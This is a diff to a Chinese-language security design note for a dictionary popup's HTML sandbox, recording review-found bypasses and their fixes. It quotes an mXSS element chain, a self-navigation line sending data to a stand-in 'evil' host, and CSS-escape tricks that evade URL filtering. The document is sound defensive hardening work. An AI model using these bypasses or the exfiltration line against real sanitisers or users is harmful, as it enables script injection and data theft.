@@ -64,10 +64,31 @@
   `<a href="https://…">` 保留（用户点了才经 `openLink` 打开）。
 - 沙箱 iframe 自带 CSP：`default-src 'none'`、`connect-src 'none'`，图片 / 字体 / 媒体只认 `image:` / `dictmedia:` / `data:`。
 
+## 第二轮：独立审查后补的三条（2026-10-23）
+
+独立审查在真 Chrome 里复现了三类绕过，第一版的判断「主文档靠净化兜住、可以不加 CSP」不成立：
+
+1. **mXSS**：净化器在 `<template>` 里净化后序列化成串、再 `innerHTML` 解析回主文档，两次解析上下文不同，
+   `<math><mtext><table><mglyph><style><img onerror>` 在第二次解析时复活，主文档 JS 带着令牌调到 `updateEntry`
+   ——桥锁定对主文档无效。导出卡片（`tempDiv.innerHTML = sanitizeHtml(…)`）与数组字符串释义
+   （`sanitizeInlineHtml` → `appendRichTextLine`）是同一个毛病。
+   → 净化与链接改写都在惰性树上做，`document.importNode` 直挂，全程不再序列化后重解析；math / svg 整个命名空间丢弃；
+   `rewriteDictLinksInTree` 是两份 dict-media.js 分叉各自的 DOM 版（扩展分叉保留 token 占位语义）。
+2. **沙箱自导航外联**：`location.href = 'https://evil/?w=…'`——srcdoc 里的 meta CSP 管不到导航后的新文档。
+   → 主文档 CSP `frame-src 'none'` 在**请求发出前**拦（srcdoc 不是网络导航，不受影响）；iframe 再挂嵌入方 `csp` 属性；
+   `load` 第二次触发即移除 frame。实测只有 frame-src 能挡住请求本身，后两道只管导航后的文档与消息。
+3. **内容层外联过滤被绕过**：CSS 转义 `\75rl(` / `@\69mport`、`image-set('…')`、`imagesrcset`、`.mdd` 里原样返回的样式表。
+   → 主文档 CSP（popup.js 加载时插入 meta，覆盖所有加载它的宿主；浏览器扩展里跳过，不能往别人的网页塞 CSP）：
+   `img-src` / `font-src` / `style-src` 只认本机来源（`'self' image: dictmedia: data: blob: file: fushi-popup:
+   https://fushi.local https://hibiki.popup`）。**`media-src` 额外放行 http(s)**：桌面 / iOS 的在线词条发音就是
+   弹窗里 `new Audio(远程 URL)` 播的，只有 Android 交原生播放器；词典内容没有发起媒体请求的通路（净化器删媒体元素的外部
+   `src`，CSS 载不了媒体）。
+
 ## 已知未做 / 降级
 
-- **主文档 CSP 未加**：Windows / iOS 内联注入 `<script>`、其余平台走 `file://` / 资产 URL，nonce / `'self'`
-  在各平台的语义差异没有真机覆盖，贸然加会让弹窗在某个平台整页白屏。主文档靠白名单 + 净化 + 沙箱兜住。
+- **主文档 CSP 不管 `script-src`**：Windows / iOS 内联注入 `<script>`、其余平台走 `file://` / 自定义 scheme，
+  没有真机覆盖就收紧脚本来源可能让弹窗在某个平台整页白屏。主文档脚本由「惰性树净化 + DOM 直挂」兜住。
+- **WebKit 不认 iframe `csp` 属性**（Chromium 专有）：iOS / macOS / Linux 上沙箱自导航只靠主文档 `frame-src`。
 - **未实现锁定的宿主不跑词典脚本**：Android `PopupDictActivity`（`androidBridge`）、macOS `GlobalLookupOverlay`、
   浏览器扩展。这些表面上依赖脚本的 MDX 词典只显示静态内容。
 - **bfcache 恢复**：原生已清令牌、页面桥闭包仍持旧令牌。页面在 `pagehide` 拆掉全部沙箱，恢复后再锁会被拒，
